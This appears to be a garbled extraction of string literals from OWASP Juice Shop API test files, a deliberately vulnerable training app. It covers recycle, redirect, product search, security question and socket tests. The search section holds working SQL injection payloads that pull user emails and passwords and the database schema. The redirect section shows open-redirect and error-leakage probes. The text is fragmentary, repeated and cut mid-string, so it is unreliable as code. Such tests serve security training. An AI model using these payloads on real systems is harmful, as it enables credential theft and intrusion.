filter'PUT qu ... 56.789'PUT quantity as accounting user from IP 123.456.789PUT quantity as accounting user from IP 123json.data.quantity'DELETE ... untant'DELETE quantity is forbidden for accountant'DELETE ...  admin'DELETE quantity is forbidden for admin'DELETE ...  users'DELETE quantity is forbidden for usersP:/My Drive/Git/juice-shop/test/api/recycleApiSpec.ts'POST new recycle'}/Recycles`'2017-05-31''Will prevent GET all recycles from this endpoint''Will GET existing recycle from this endpoint'}/Recycles/1`'PUT update existing recycle is forbidden''DELETE existing recycle is forbidden'POST new recycle`${API_ ... cycles`/Recyclesdate: '2017-05-31'2017-05-31it('Wil ... )\r\n  })'Will p ... dpoint'Will prevent GET all recycles from this endpointfrisby. ... ycles`)'Will G ... dpoint'Will GET existing recycle from this endpointfrisby. ... les/1`)`${API_ ... cles/1`/Recycles/1UserId: Joi.number()Address ... umber()quantit ... umber()isPicku ... olean()date: Joi.date()Joi.date()Joi.datePUT update existing recycle is forbiddenquantity: 100000DELETE existing recycle is forbiddenP:/My Drive/Git/juice-shop/test/api/redirectSpec.ts'GET redirected to https://github.com/juice-shop/juice-shop when this URL is passed as "to" parameter'}/redirect?to=https://github.com/juice-shop/juice-shop`'GET redirected to https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm when this URL is passed as "to" parameter'}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm`'GET redirected to http://shop.spreadshirt.com/juiceshop when this URL is passed as "to" parameter'}/redirect?to=http://shop.spreadshirt.com/juiceshop`'GET redirected to http://shop.spreadshirt.de/juiceshop when this URL is passed as "to" parameter'}/redirect?to=http://shop.spreadshirt.de/juiceshop`'GET redirected to https://www.stickeryou.com/products/owasp-juice-shop/794 when this URL is passed as "to" parameter'}/redirect?to=https://www.stickeryou.com/products/owasp-juice-shop/794`'GET redirected to https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW when this URL is passed as "to" parameter'}/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW`'GET redirected to https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6 when this URL is passed as "to" parameter'}/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6`'GET error message with information leakage when calling /redirect without query parameter'}/redirect`'TypeError''of undefined''&#39;includes&#39;''GET error message with information leakage when calling /redirect with unrecognized query parameter'}/redirect?x=y`'GET error message hinting at allowlist validation when calling /redirect with an unrecognized "to" target'}/redirect?to=whatever`'Unrecognized target URL for redirect: whatever''GET redirected to target URL in "to" parameter when a allow-listed URL is part of the query string'}/redirect?to=/score-board?satisfyIndexOf=https://github.com/juice-shop/juice-shop`'GET re ... ameter'GET redirected to https://github.com/juice-shop/juice-shop when this URL is passed as "to" parameterGET redirected to https://githubcom/juice-shop/juice-shop when this URL is passed as "to" parameterfrisby. ... ual' })`${URL} ... e-shop`/redire ... ce-shop/redirect?to=https://github.com/juice-shop/juice-shop{ redir ... nual' }GET redirected to https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm when this URL is passed as "to" parameterGET redirected to https://blockchaininfo/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm when this URL is passed as "to" parameter`${URL} ... G8DRZm`/redire ... wG8DRZmGET redirected to http://shop.spreadshirt.com/juiceshop when this URL is passed as "to" parameterGET redirected to http://shopcom/juiceshop when this URL is passed as "to" parameter`${URL} ... ceshop`/redire ... iceshop/redirect?to=http://shop.spreadshirt.com/juiceshopGET redirected to http://shop.spreadshirt.de/juiceshop when this URL is passed as "to" parameterde/juiceshop when this URL is passed as "to" parameter/redirect?to=http://shop.spreadshirt.de/juiceshopGET redirected to https://www.stickeryou.com/products/owasp-juice-shop/794 when this URL is passed as "to" parameterGET redirected to https://wwwcom/products/owasp-juice-shop/794 when this URL is passed as "to" parameter`${URL} ... op/794`/redire ... hop/794/redirect?to=https://www.stickeryou.com/products/owasp-juice-shop/794GET redirected to https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW when this URL is passed as "to" parameterGET redirected to https://explorerorg/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW when this URL is passed as "to" parameter`${URL} ... ZN17kW`/redire ... oZN17kWGET redirected to https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6 when this URL is passed as "to" parameterGET redirected to https://etherscanio/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6 when this URL is passed as "to" parameter`${URL} ... 11eae6`/redire ... 311eae6'GET er ... ameter'GET error message with information leakage when calling /redirect without query parameterreturn  ... &#39;')frisby. ... &#39;')frisby. ... fined')frisby. ... irect`)`${URL}/redirect`of undefined&#39;includes&#39;GET error message with information leakage when calling /redirect with unrecognized query parameterfrisby. ... t?x=y`)`${URL} ... ct?x=y`/redirect?x=y'GET er ... target'GET error message hinting at allowlist validation when calling /redirect with an unrecognized "to" targetreturn  ... tever')frisby. ... ', 406)frisby. ... tever`)`${URL} ... atever`/redire ... hatever/redirect?to=whatever'Unreco ... atever'Unrecognized target URL for redirect: whatever'GET re ... string'GET redirected to target URL in "to" parameter when a allow-listed URL is part of the query stringfrisby. ... -shop`)/redirect?to=/score-board?satisfyIndexOf=https://github.com/juice-shop/juice-shopP:/My Drive/Git/juice-shop/test/api/repeatNotificationSpec.ts'GET triggers repeating notification without passing a challenge''/repeat-notification''GET triggers repeating notification passing an unsolved challenge''/repeat-notification?challenge=Retrieve%20Blueprint''GET triggers repeating notification passing a solved challenge''/repeat-notification?challenge=Error%20Handling'GET triggers repeating notification without passing a challengeREST_UR ... cation''/repea ... cation'/repeat-notificationGET triggers repeating notification passing an unsolved challengefrisby. ... print')REST_UR ... eprint''/repea ... eprint'/repeat-notification?challenge=Retrieve%20BlueprintGET triggers repeating notification passing a solved challengefrisby. ... dling')REST_UR ... ndling''/repea ... ndling'/repeat-notification?challenge=Error%20HandlingP:/My Drive/Git/juice-shop/test/api/searchApiSpec.ts no check for Bender's password as it might have already been changed by different test// no c ... nt testchristmasProductpastebinLeakProduct'GET product search with no matches returns no products'}/products/search?q=nomatcheswhatsoever`'GET product search with one match returns found product'}/products/search?q=o-saft`'GET product search fails with error message that exposes ins SQL Injection vulnerability'}/products/search?q=';`'SQLITE_ERROR: near &quot;;&quot;: syntax error''GET product search SQL Injection fails from two missing closing parenthesis'}/products/search?q=' union select id,email,password from users--`'SQLITE_ERROR: near &quot;union&quot;: syntax error''GET product search SQL Injection fails from one missing closing parenthesis'}/products/search?q=') union select id,email,password from users--`'GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns'}/products/search?q=')) union select * from users--`'SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns''GET product search can create UNION SELECT with Users table and fixed columns'}/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--`'3''6''7''8''GET product search can create UNION SELECT with Users table and required columns'}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--``ciso@${`support@${'GET product search can create UNION SELECT with sqlite_master table and required column'}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))''CREATE TABLE sqlite_sequence(name,seq)''GET product search cannot select logically deleted christmas special by default'}/products/search?q=seasonal%20special%20offer`'GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination'}/products/search?q=seasonal%20special%20offer'))--`'GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause'}/products/search?q=${}'))--`'GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause''GET product search with empty search parameter returns all products'}/Products`}/products/search?q=`'GET product search without search parameter returns all products'}/products/search`const c ... nge)[0]christm ... nge)[0]config. ... nge)[0]const p ... nge)[0]pastebi ... nge)[0]'GET pr ... oducts'GET product search with no matches returns no productsfrisby. ... oever`)`${REST ... soever`/produc ... tsoever/products/search?q=nomatcheswhatsoever'GET pr ... roduct'GET product search with one match returns found productfrisby. ... -saft`)`${REST ... o-saft`/produc ... =o-saft/products/search?q=o-saft'GET pr ... bility'GET product search fails with error message that exposes ins SQL Injection vulnerabilityreturn  ... error')frisby. ... error')frisby. ... ?q=';`)`${REST ... h?q=';`/produc ... ch?q=';/products/search?q=';'SQLITE ...  error'SQLITE_ERROR: near &quot;;&quot;: syntax error'GET pr ... thesis'GET product search SQL Injection fails from two missing closing parenthesisfrisby. ... ers--`)`${REST ... sers--`/produc ... users--/products/search?q=' union select id,email,password from users--SQLITE_ERROR: near &quot;union&quot;: syntax errorGET product search SQL Injection fails from one missing closing parenthesis/products/search?q=') union select id,email,password from users--'GET pr ... olumns'GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columnsGET product search SQL Injection fails for SELECT FROM attack due to wrong number of returned columnsreturn  ...  => {})frisby. ...  => {})/products/search?q=')) union select * from users--'SQLITE ... olumns'SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columnsGET product search can create UNION SELECT with Users table and fixed columns/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--id: '1'name: '2'description: '3'price: '4'deluxePrice: '5'image: '6'createdAt: '7'updatedAt: '8'GET product search can create UNION SELECT with Users table and required columns/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--price:  ... ain')}`deluxeP ... in123')securit ... in123')deluxeP ... -1701')securit ... -1701')price:  ... il.com'deluxeP ... vamI=')securit ... vamI=')id: 5`ciso@$ ... ain')}`deluxeP ... !YbJb')securit ... !YbJb')id: 6`suppor ... ain')}`deluxeP ... @RF$P')securit ... @RF$P')'GET pr ... column'GET product search can create UNION SELECT with sqlite_master table and required columnfrisby. ... ter--`)`${REST ... ster--`/produc ... aster--/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--id: 'CR ... tId`))''CREATE ... tId`))'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`)`ProductId` INTEGER REFERENCES `Products` (`id`)`id` ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets`  ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`)`ProductId`, `BasketId`id: 'CR ... e,seq)''CREATE ... e,seq)'CREATE TABLE sqlite_sequence(name,seq)CREATE TABLE sqlite_sequence(name,seq)name,seq'GET pr ... efault'GET product search cannot select logically deleted christmas special by defaultfrisby. ... offer`)`${REST ... 0offer`/produc ... 20offer/products/search?q=seasonal%20special%20offer'GET pr ... nation'GET product search by description cannot select logically deleted christmas special due to forced early where-clause terminationfrisby. ... '))--`)`${REST ... r'))--`/produc ... er'))--/products/search?q=seasonal%20special%20offer'))--'GET pr ... clause'GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause`${REST ... }'))--`/products/search?q=christm ... ct.name'))--expect( ... t.name)GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clausepastebi ... ct.nameGET product search with empty search parameter returns all productsfrisby. ... ducts`)`${API_ ... oducts`const p ... on.dataproducts = json.datafrisby. ... ch?q=`)`${REST ... rch?q=`GET product search without search parameter returns all productsfrisby. ... earch`)`${REST ... search`/products/searchP:/My Drive/Git/juice-shop/test/api/securityAnswerApiSpec.ts'GET all security answers is forbidden via public API even when authenticated'}/SecurityAnswers`'POST new security answer for existing user fails from unique constraint''Validation error''GET existing security answer by id is forbidden via public API even when authenticated'}/SecurityAnswers/1`'POST security answer for a newly registered user''new.user@te.st''PUT update existing security answer is forbidden via public API even when authenticated''Blurp''DELETE existing security answer is forbidden via public API even when authenticated''GET al ... icated'GET all security answers is forbidden via public API even when authenticated`${API_ ... nswers`/SecurityAnswers'POST n ... traint'POST new security answer for existing user fails from unique constraintanswer: 'Horst'Validation errorGET existing security answer by id is forbidden via public API even when authenticated`${API_ ... wers/1`/SecurityAnswers/1'POST s ... d user'POST security answer for a newly registered useremail:  ... @te.st'new.user@te.stuser@testpassword: '12345'UserId: json.idjson.idPUT update existing security answer is forbidden via public API even when authenticatedanswer: 'Blurp'BlurpDELETE existing security answer is forbidden via public API even when authenticatedP:/My Drive/Git/juice-shop/test/api/securityQuestionApiSpec.ts'GET all security questions '}/SecurityQuestions`'POST new security question is forbidden via public API even when authenticated''Your own first name?''GET existing security question by id is forbidden via public API even when authenticated'}/SecurityQuestions/1`'PUT update existing security question is forbidden via public API even when authenticated''DELETE existing security question is forbidden via public API even when authenticated''GET security question for an existing user\'s email address'}/user/security-question?email=jim@${'question''Your eldest siblings middle name?''GET security question returns nothing for an unknown email address'}/user/security-question?email=horst@unknown-us.er`'GET security question throws error for missing email address'}/user/security-question`'Error: WHERE parameter &quot;email&quot; has invalid &quot;undefined&quot; value''GET security question is not susceptible to SQL Injection attacks'}/user/security-question?email=';`'GET al ... tions 'GET all security questions frisby. ... tions`)`${API_ ... stions`/SecurityQuestionsquestio ... tring()POST new security question is forbidden via public API even when authenticated'Your o ...  name?'Your own first name?Your own first namGET existing security question by id is forbidden via public API even when authenticated`${API_ ... ions/1`/SecurityQuestions/1PUT update existing security question is forbidden via public API even when authenticatedDELETE existing security question is forbidden via public API even when authenticated'GET se ... ddress'GET security question for an existing user's email addressfrisby. ... in')}`)`${REST ... ain')}`/user/s ... il=jim@/user/security-question?email=jim@Your eldest siblings middle namGET security question returns nothing for an unknown email addressreturn  ... n', {})frisby. ... n', {})frisby. ... us.er`)`${REST ... -us.er`/user/s ... n-us.er/user/security-question?email=horst@unknown-us.erGET security question throws error for missing email addressreturn  ... value')frisby. ... value')frisby. ... stion`)`${REST ... estion`/user/s ... uestion/user/security-question'Error: ...  value'Error: WHERE parameter &quot;email&quot; has invalid &quot;undefined&quot; value'GET se ... ttacks'GET security question is not susceptible to SQL Injection attacksfrisby. ... il=';`)`${REST ... ail=';`/user/s ... mail=';/user/security-question?email=';P:/My Drive/Git/juice-shop/test/api/socketSpec.ts'WebSocket'SocketIOClientreconnectionDelayforceNew'connect''server handles confirmation messages for emitted challenge resolutions''Find the carefully hidden \'Score Board\' page.''Provoke an error that is not very gracefully handled.''Log in with the administrator\'s user account.''Retrieve a list of all user credentials via SQL Injection''Post some feedback in another user\'s name.''Wherever you go, there you are.''Place an order that makes you rich.''Access a confidential document.''Access a salesman\'s forgotten backup file.''Change Bender\                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        